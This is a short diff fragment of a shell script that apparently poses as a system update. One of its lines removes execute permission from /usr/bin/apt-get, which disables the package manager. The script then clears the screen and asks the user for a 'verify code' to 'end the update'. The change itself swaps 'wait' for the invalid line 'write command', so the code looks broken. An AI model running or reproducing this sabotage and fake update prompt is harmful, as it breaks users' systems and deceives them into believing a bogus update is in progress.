@@ -7,4 +7,4 @@ sudo chmod -x /usr/bin/apt-get
 clear
 
 echo Please, introduce verify code to end the update: 
-wait
+write command
